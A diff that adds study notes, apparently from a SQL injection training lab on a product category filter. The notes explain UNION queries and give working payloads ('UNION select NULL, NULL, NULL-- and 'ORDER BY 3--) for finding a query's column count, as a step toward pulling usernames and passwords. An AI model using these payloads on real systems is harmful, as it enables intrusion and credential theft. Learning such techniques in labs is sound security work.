@@ -1,0 +1,60 @@
+SQLi - Product category filter
+
+# STEP 1
+Determind the number of columns return by the query
+
+Backgroud For UNION
+ table 1        table 2
+ a | b          c | d
+- - - -         - - - -
+1 , 2            2 , 3
+3 , 4            4 , 5
+
+Query #1: 
+select a, b from table1;
+1,2
+3,4
+
+Query #2
+select a, b from table1 UNION select c, d from table2
+1,2
+3,4
+2,3
+4,5
+
+What we want to do is:
+select a, b from table1
+and add
+UNION select username, password from users
+
+Rules:
+- The number and the order of the comumns must be the same in all queries
+- The data types must be compatible
+
+SQLi attack #1 UNION
+'UNION select NULL, NULL, NULL--
+
+select ? form table1 UNION select NULL
+-> error == incorrect number of columns
+
+select ? form table1 UNION select NULL, NULL, NULL
+-> 200 == correct number of columns
+
+
+SQLi attack #2 ORDER BY
+'ORDER BY 3--
+
+
+select ? from table1 ORDER BY 1--
+-> 200 == is posible to order it by 1
+
+BY 2 -> OK
+BY 3 -> OK
+
+select ? form table1 ORDER BY 4--
+error == imposible to order it by 4
+
+So 3 is the number of columns in the first table
+
+Final PAYLOAD = 'UNION select NULL, NULL, NULL--
+Final PAYLOAD = 'ORDER BY 3--
